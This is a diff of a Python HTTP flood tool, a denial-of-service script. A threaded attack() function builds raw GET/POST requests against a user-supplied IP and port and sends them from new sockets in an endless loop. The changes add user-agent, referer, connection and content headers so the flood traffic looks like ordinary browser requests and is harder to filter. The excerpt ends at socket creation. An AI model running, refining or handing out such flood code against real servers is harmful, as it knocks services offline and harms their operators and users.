@@ -15,16 +15,19 @@ protocol = str(input("Protocol(GET,POST,DELETE,HEAD):"))
 useragents = [""]
 acceptall = [""]
 ref = [""]
-connection = ("Keep-Alive", random.randint(110,160))
+connection = "keep-alive"
 content    = "Content-Type: application/x-www-form-urlencoded\r\n"
 length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
 num_sent = 0
 go = threading.Event()
 def attack():
     global num_sent, useragents, acceptall, ref, connection, content, length
+    useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
     accept    = random.choice(acceptall)
-    get_host = protocol + " /?=" + str(random.randint(0,2000)) + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
-    request  = get_host + accept + "\r\n"
+    referer   = "Referer: " +random.choice(ref) + ip + "\r\n"
+    get_host = protocol + " /?=" + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+    conn = "Connection: " + connection + "\r\n"
+    request  = get_host + conn + useragent + accept + referer + content + length + "\r\n"
     go.wait()
     while True:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
